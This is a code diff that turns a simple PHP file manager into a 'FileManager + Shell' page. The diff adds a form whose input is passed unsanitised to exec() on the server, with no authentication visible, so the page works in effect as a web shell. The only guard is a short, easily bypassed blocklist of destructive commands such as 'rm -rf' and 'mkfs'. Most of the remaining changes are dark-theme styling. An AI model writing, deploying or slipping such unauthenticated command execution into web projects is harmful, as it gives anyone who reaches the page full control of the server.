@@ -1,6 +1,6 @@
 <?php
 // ============================================
-// Простой PHP FileManager (без ограничений)
+// PHP FileManager + System Commands
 // ============================================
 
 // Текущая директория
@@ -16,6 +16,41 @@ if (!is_dir($current_path)) {
 // Обработка действий
 $message = '';
 $error = '';
+$command_output = '';
+$command_error = '';
+
+// === ВЫПОЛНЕНИЕ КОМАНД ===
+if (isset($_POST['execute_command'])) {
+    $command = trim($_POST['command']);
+    if (!empty($command)) {
+        // Проверка на опасные команды (опционально)
+        $dangerous = ['rm -rf', 'dd if=', 'mkfs', 'format', 'shutdown', 'reboot', 'halt'];
+        $is_dangerous = false;
+        foreach ($dangerous as $danger) {
+            if (stripos($command, $danger) !== false) {
+                $is_dangerous = true;
+                break;
+            }
+        }
+        
+        if ($is_dangerous) {
+            $command_error = "⚠️ Опасная команда заблокирована!";
+        } else {
+            // Изменяем директорию и выполняем команду
+            $output = [];
+            $return_code = 0;
+            chdir($current_path);
+            exec($command . ' 2>&1', $output, $return_code);
+            
+            if ($return_code === 0) {
+                $command_output = implode("\n", $output);
+                $message = "✅ Команда выполнена успешно (код: $return_code)";
+            } else {
+                $command_error = "❌ Ошибка выполнения (код: $return_code)\n" . implode("\n", $output);
+            }
+        }
+    }
+}
 
 // Создание папки
 if (isset($_POST['create_dir'])) {
@@ -102,56 +137,172 @@ function formatSize($bytes) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FileManager</title>
+    <title>FileManager + Shell</title>
     <style>
-        body { font-family: Arial; max-width: 1000px; margin: 20px auto; padding: 0 15px; background: #f0f0f0; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; margin-top: 0; }
-        .nav { padding: 10px; background: #f9f9f9; border-radius: 4px; margin: 10px 0; word-break: break-all; }
+        * { box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; max-width: 1200px; margin: 20px auto; padding: 0 15px; background: #1a1a1a; color: #e0e0e0; }
+        .container { background: #2d2d2d; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
+        h1 { color: #4CAF50; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; margin-top: 0; text-shadow: 0 0 10px rgba(76,175,80,0.3); }
+        .nav { padding: 10px; background: #3d3d3d; border-radius: 4px; margin: 10px 0; word-break: break-all; border-left: 3px solid #4CAF50; }
         .nav a { color: #4CAF50; text-decoration: none; font-weight: bold; }
         .nav a:hover { text-decoration: underline; }
-        .msg { padding: 10px; margin: 10px 0; border-radius: 4px; }
-        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        .tools { display: flex; flex-wrap: wrap; gap: 15px; padding: 15px; background: #f9f9f9; border-radius: 4px; margin: 15px 0; }
+        .msg { padding: 10px; margin: 10px 0; border-radius: 4px; border-left: 4px solid; }
+        .success { background: #1a3a1a; color: #8bc34a; border-color: #4CAF50; }
+        .error { background: #3a1a1a; color: #ef5350; border-color: #f44336; }
+        .tools { display: flex; flex-wrap: wrap; gap: 15px; padding: 15px; background: #3d3d3d; border-radius: 4px; margin: 15px 0; }
         .tools form { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; flex: 1; }
-        .tools input[type="text"], .tools input[type="file"] { padding: 8px; border: 1px solid #ddd; border-radius: 4px; flex: 1; min-width: 120px; }
-        .btn { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; color: white; }
+        .tools input[type="text"], .tools input[type="file"] { 
+            padding: 8px 12px; 
+            border: 1px solid #555; 
+            border-radius: 4px; 
+            background: #1a1a1a; 
+            color: #e0e0e0;
+            flex: 1; 
+            min-width: 120px;
+            font-family: inherit;
+        }
+        .tools input[type="text"]:focus {
+            border-color: #4CAF50;
+            outline: none;
+            box-shadow: 0 0 10px rgba(76,175,80,0.2);
+        }
+        .btn { 
+            padding: 8px 16px; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            color: white; 
+            font-family: inherit;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn:hover { transform: scale(1.02); filter: brightness(1.1); }
         .btn-green { background: #4CAF50; }
-        .btn-green:hover { background: #45a049; }
         .btn-red { background: #f44336; }
-        .btn-red:hover { background: #da190b; }
         .btn-orange { background: #ff9800; }
-        .btn-orange:hover { background: #e68900; }
         .btn-blue { background: #2196F3; }
-        .btn-blue:hover { background: #0b7dda; }
-        .item { display: flex; justify-content: space-between; align-items: center; padding: 10px; margin: 5px 0; background: #f9f9f9; border-radius: 4px; flex-wrap: wrap; }
-        .item:hover { background: #f0f0f0; }
+        .btn-purple { background: #9C27B0; }
+        
+        .command-section {
+            background: #1a1a1a;
+            border: 2px solid #4CAF50;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .command-section h2 {
+            color: #4CAF50;
+            margin-top: 0;
+            font-size: 18px;
+        }
+        .command-input {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .command-input input[type="text"] {
+            flex: 1;
+            min-width: 200px;
+            padding: 10px 15px;
+            background: #0d0d0d;
+            border: 1px solid #4CAF50;
+            border-radius: 4px;
+            color: #8bc34a;
+            font-family: inherit;
+            font-size: 14px;
+        }
+        .command-input input[type="text"]:focus {
+            outline: none;
+            box-shadow: 0 0 20px rgba(76,175,80,0.3);
+        }
+        .command-output {
+            background: #0d0d0d;
+            color: #8bc34a;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 10px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+            border-left: 3px solid #4CAF50;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .command-output.error {
+            border-left-color: #f44336;
+            color: #ef5350;
+        }
+        .command-prompt {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        
+        .item { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 10px; 
+            margin: 5px 0; 
+            background: #3d3d3d; 
+            border-radius: 4px; 
+            flex-wrap: wrap;
+            border-left: 3px solid transparent;
+            transition: all 0.2s;
+        }
+        .item:hover { 
+            background: #4a4a4a; 
+            border-left-color: #4CAF50;
+        }
         .item-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 150px; }
         .item-icon { font-size: 24px; }
         .item-name { word-break: break-all; }
-        .item-name a { color: #333; text-decoration: none; }
-        .item-name a:hover { text-decoration: underline; }
-        .item-size { color: #666; font-size: 13px; margin-left: 10px; }
+        .item-name a { color: #e0e0e0; text-decoration: none; }
+        .item-name a:hover { color: #4CAF50; text-decoration: underline; }
+        .item-size { color: #888; font-size: 13px; margin-left: 10px; }
         .item-actions { display: flex; gap: 5px; flex-wrap: wrap; align-items: center; }
         .rename-form { display: flex; gap: 5px; align-items: center; }
-        .rename-form input[type="text"] { padding: 4px 8px; border: 1px solid #ddd; border-radius: 4px; width: 120px; }
-        .empty { text-align: center; color: #999; padding: 40px 0; }
+        .rename-form input[type="text"] { 
+            padding: 4px 8px; 
+            border: 1px solid #555; 
+            border-radius: 4px; 
+            background: #1a1a1a; 
+            color: #e0e0e0;
+            width: 120px;
+            font-family: inherit;
+        }
+        .empty { text-align: center; color: #666; padding: 40px 0; font-style: italic; }
+        
+        /* Скроллбар */
+        .command-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        .command-output::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        .command-output::-webkit-scrollbar-thumb {
+            background: #4CAF50;
+            border-radius: 4px;
+        }
+        
         @media (max-width: 600px) {
             .item { flex-direction: column; align-items: stretch; }
             .item-left { margin-bottom: 8px; }
             .rename-form input[type="text"] { width: 100%; }
             .tools form { flex-direction: column; }
+            .command-input { flex-direction: column; }
+            .command-input input[type="text"] { width: 100%; }
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📁 Файловый менеджер</h1>
+    <h1>💻 FileManager + Shell</h1>
     
     <!-- Навигация -->
     <div class="nav">
-        <strong>Путь:</strong> /<?php echo htmlspecialchars($current_dir ?: ''); ?>
+        <strong>📂 Путь:</strong> /<?php echo htmlspecialchars($current_dir ?: ''); ?>
         <?php if ($current_dir): ?>
             <a href="?dir=<?php echo urlencode($parent); ?>"> ⬆ Наверх</a>
         <?php endif; ?>
@@ -164,6 +315,32 @@ function formatSize($bytes) {
     <?php if ($error): ?>
         <div class="msg error"><?php echo htmlspecialchars($error); ?></div>
     <?php endif; ?>
+    
+    <!-- === КОМАНДНАЯ СТРОКА === -->
+    <div class="command-section">
+        <h2>⚡ Выполнение команд</h2>
+        <div class="command-input">
+            <form method="POST" style="display:flex; gap:10px; flex:1; flex-wrap:wrap;">
+                <span class="command-prompt">$</span>
+                <input type="text" name="command" placeholder="Введите команду (например: ls -la, pwd, whoami)" 
+                       value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>"
+                       autofocus>
+                <button type="submit" name="execute_command" class="btn btn-purple">▶ Выполнить</button>
+            </form>
+        </div>
+        
+        <?php if ($command_output): ?>
+            <div class="command-output"><?php echo htmlspecialchars($command_output); ?></div>
+        <?php endif; ?>
+        
+        <?php if ($command_error): ?>
+            <div class="command-output error"><?php echo htmlspecialchars($command_error); ?></div>
+        <?php endif; ?>
+        
+        <div style="margin-top: 10px; font-size: 12px; color: #888;">
+            <strong>Примеры:</strong> ls -la, pwd, whoami, date, echo "Hello", ps aux, df -h
+        </div>
+    </div>
     
     <!-- Инструменты -->
     <div class="tools">
@@ -179,7 +356,7 @@ function formatSize($bytes) {
     
     <!-- Список -->
     <?php if (empty($items)): ?>
-        <div class="empty">Папка пуста</div>
+        <div class="empty">📭 Папка пуста</div>
     <?php else: ?>
         <?php foreach ($items as $item): 
             $path = $current_path . '/' . $item;
@@ -213,6 +390,10 @@ function formatSize($bytes) {
             </div>
         <?php endforeach; ?>
     <?php endif; ?>
+    
+    <div style="margin-top: 20px; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #3d3d3d; padding-top: 15px;">
+        ⚡ Работает в директории: <?php echo htmlspecialchars($current_path); ?>
+    </div>
 </div>
 </body>
 </html>
